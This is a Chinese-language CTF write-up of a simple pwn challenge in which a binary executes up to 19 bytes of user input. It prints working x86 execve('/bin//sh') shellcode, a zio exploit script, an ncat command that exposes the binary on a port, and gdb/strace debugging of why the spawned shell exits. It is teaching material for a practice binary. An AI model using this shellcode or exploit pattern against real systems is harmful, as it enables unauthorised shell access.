---
category: CTF
title: Pwn Challenge 0
---

## Pwn Challenge 0

> 遇到一个简单的Pwn，记录一下，有一些有意思的问题也放在这里。

### Pwn汇编代码

这个程序很简单，Binary在[这里]({{ site.url }}/resources/Binary/2017-05-06-pwn_1)，直接把它的反汇编贴在下面：

```
.text:0804847D                 push    ebp
.text:0804847E                 mov     ebp, esp
.text:08048480                 and     esp, 0FFFFFFF0h
.text:08048483                 sub     esp, 30h
.text:08048486                 mov     dword ptr [esp+8], 14h
.text:0804848E                 lea     eax, [esp+13h]
.text:08048492                 mov     [esp+4], eax    ; buf
.text:08048496                 mov     dword ptr [esp], 0 ; fd
.text:0804849D                 call    _read
.text:080484A2                 mov     byte ptr [esp+26h], 0
.text:080484A7                 lea     eax, [esp+13h]
.text:080484AB                 mov     [esp], eax      ; s
.text:080484AE                 call    _strlen
.text:080484B3                 mov     [esp+4], eax
.text:080484B7                 mov     dword ptr [esp], offset format ; "%d welcome\n"
.text:080484BE                 call    _printf
.text:080484C3                 lea     eax, [esp+13h]
.text:080484C7                 mov     [esp+2Ch], eax
.text:080484CB                 mov     eax, [esp+2Ch]
.text:080484CF                 call    eax
.text:080484D1                 leave
.text:080484D2                 retn
.text:080484D2 main            endp
```

### 分析

这个题的设定很刻意，现实中恐怕见不到这么明显的漏洞了。大概说一下，就是我们输入的内容会被当做指令执行，然而我们最多只能输入19个字节。输入的东西就直接是shellcode，也不用劫持控制流了（也劫持不了，19个字节不够覆盖到返回地址）。现在就考虑找一段shellcode。

[Exploit-db](https://www.exploit-db.com/exploits/41757/)在这时就显得非常有用了。可以直接找指定长度的shellcode。我找了一个19字节的：

```
; Shellcode : 
char shellcode[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
;================================================================================
; Python : 
        shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
;================================================================================
; Assembly language code : 
global _start
        _start:
                push 0bH
                pop eax
                cdq
                push edx
                push "//sh"
                push "/bin"
                mov ebx, esp
                int 80H
;================================================================================
```

然后用zio写一个Exp：

{% highlight python %}
from zio import *

IP = "127.0.0.1"
port = 10000

shellcode = '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\n'
conn = zio((IP, port))
#conn = zio("./pwn_1")
conn.write(shellcode)
conn.interact()
{% endhighlight %}

用ncat把漏洞程序挂上：

```
ncat -l 10000 -e ./pwn_1
```

### 问题

**一 | IDA Pro反编译出错**

IDA Pro在遇到这种`call eax`指令时会出错。报

```
Decompilation failure:
80484CF: call analysis failed
```

想想也能想得通，相当于指令是运行时才确定的，它当然不能被静态分析了。

**二 | 打开的shell直接退出**

这个问题发生在手动输入shellcode的时候。如下：

```
python -c "print('\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')" | ./pwn_1
```

这样直接就退出了。为了查看细节，我先

```
python -c "print('\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')" > shellcode
```

然后在gdb中

```
r < shellcode
```

单步执行到`int 0x80`后，发现gdb提示

```
process 26793 is executing new program: /bin/dash
```

说明shell成功打开了呀。

我们再用strace追一下：

```
strace ./pwn_1 < shellcode
```

我们看到

```
execve("/bin//sh", [0], [/* 0 vars */]) = 0
```

然而，execve正常执行成功时是不会返回的。这里为什么返回了呢？上面用zio写的脚本在interact()后成功连接上了打开的shell，没有直接退出呀。

在[网上的一篇文章](http://www.purpleroc.com/md/2016-02-25@Thinking-About-Level2.html)的提示下，我gdb不设断点，直接`r < shellcode`可以看到出错提示：

```
[New process 28700]
/bin/dash: not found
[Inferior 2 (process 28700) exited with code 0177]
```

这个出错码0177和上面提到的文章里是一样的。情况很类似，不同的是我是通过`int 0x80`来调用execve，他是通过`system()`来调用。

来看一下在即将执行`int 0x80`时寄存器和栈的情况：

```
EAX: 0xb ('\x0b')
EBX: 0xbffff660 ("/bin//sh")
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0xbffff6a8 --> 0x0 
ESP: 0xbffff660 ("/bin//sh")

gdb-peda$ x/10x $esp
0xbffff660:     0x6e69622f      0x68732f2f      0x00000000      
```

感觉没问题呀，shellcode也是有效的。这是为什么呢？

后来我们进行了一个测试，编写一个简单地`/bin/zz`，功能是打印`123`，然后把 shellcode 改为运行这个程序，结果成功运行并打印。但是 shell 却一直起不来。

因为用`zio`能够成功，我们找来`zio`的源码看一下：

首先是`zio.write()`：

{% highlight python %}
def write(self, s):
    if not s: return 0
    if self.mode() == SOCKET:
        if self.print_write: stdout(self._print_write(s))
        self.sock.sendall(s)
    return len(s)
{% endhighlight %}

然后是`zio.interact()`：

{% highlight python %}
if self.mode() == SOCKET: # socket
    while self.isalive():
        try:
            r, w, e = self.__select([self.rfd, pty.STDIN_FILENO], [], [])
        except KeyboardInterrupt:
            break
        if self.rfd in r:
            try:
                data = None
                data = self._read(1024)
                if data:
                    if output_filter: data = output_filter(data)
                    stdout(raw_rw and data or self._print_read(data))
                else:       # EOF
                    self.flag_eof = True
                    break
            except EOF:
                self.flag_eof = True
                break
        if pty.STDIN_FILENO in r:
            try:
                data = None
                data = os.read(pty.STDIN_FILENO, 1024)
            except OSError as e:
                # the subprocess may have closed before we get to reading it
                if e.errno != errno.EIO:
                    raise
            if data is not None:
                if input_filter: data = input_filter(data)
                i = input_filter and -1 or data.rfind(escape_character)
                if i != -1: data = data[:i]
                try:
                    while data != b'' and self.isalive():
                        n = self._write(data)
                        data = data[n:]
                    if i != -1:
                        break
                except:         # write error, may be socket.error, Broken pipe
                    break
    return
{% endhighlight%}

上面就是一个标准的 select 模型，如果 socket 可读，就读出并打印到标准输出；如果标准输入可读，就读取标准输入，并发送到 socket。

看来并没有特别之处。不过`zio`类的构造函数倒是很长，改日继续分析吧。

### 附录

**验证shellcode是否有效**

将从Exploit-db上拿到的shellcode汇编代码保存为`shell.asm`，

```
nasm -f elf shell.asm
ld -o shell shell.o
```

执行一下，看看能否打开shell。